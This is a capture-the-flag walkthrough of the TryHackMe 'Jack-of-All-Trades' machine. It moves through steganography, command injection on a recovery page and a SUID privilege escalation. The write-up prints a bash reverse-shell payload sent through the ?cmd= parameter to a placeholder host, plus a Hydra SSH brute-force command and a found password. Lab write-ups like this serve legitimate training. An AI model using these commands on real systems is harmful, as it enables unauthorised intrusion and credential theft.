#  TryHackMe Writeup Jack-of-All-Trades

## Introduction:
In this challenge, we analyze a non-standard service setup, discover an RCE vulnerability, use steganography, and escalate privileges to root.

## Port Scanning
```python
22/tcp open  http    Apache httpd 2.4.10 (Debian)  
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5
```
Ports are switched: HTTP on 22, SSH on 80.

## Enumeration
On port 22 (web server), we discover a base64-encoded string:
```python
UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMg...
```
Decoded, it reveals:
> Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing!
Also gotta remember your password: u?WtKSraq

We also find a hidden page:
```python
/recovery.php
```
## Further Enumeration
On /recovery.php, we discover a base32-encoded string. After decoding, we get a message:

> Remember that the credentials to the recovery login are hidden on the homepage!
Here's a hint: bit.ly/2TvYQ2S

Following the link reveals the word Stegosauria, suggesting steganography.

## Steganography
From the homepage, we extract headers.jpg.

Use steghide to extract embedded content using the earlier-found password:

```python
steghide extract -sf headers.jpg
```
It gives us cms.creds containing login credentials for /recovery.php.

## RCE & Reverse Shell
The page is vulnerable to command injection via ?cmd=:
```python
http://10.10.56.56:22/recovery.php?cmd=whoami
```
We execute a reverse shell:
```python
http://target/recovery.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR-IP/4444+0>%261'
```
## Brute-force SSH
We find a file: jacks_password_list containing possible passwords.

Using Hydra:
```python
hydra -l john -P jacks_password_list ssh://10.10.56.56 -s 80
```
We successfully log in.

## File Exfiltration
We download user.jpg using a Python HTTP server:
```python
python -m SimpleHTTPServer
```
Navigate to: http://10.10.56.56:8000

## Privilege Escalation
Find SUID binaries:
```python
find / -perm -u=s -type f 2>/dev/null
```
One of them is:
```python
/usr/bin/strings /root/root.txt
```
This reveals the root flag.

## Conclusion:

We successfully gained access, extracted user and root flags, and completed the machine via a SUID binary.
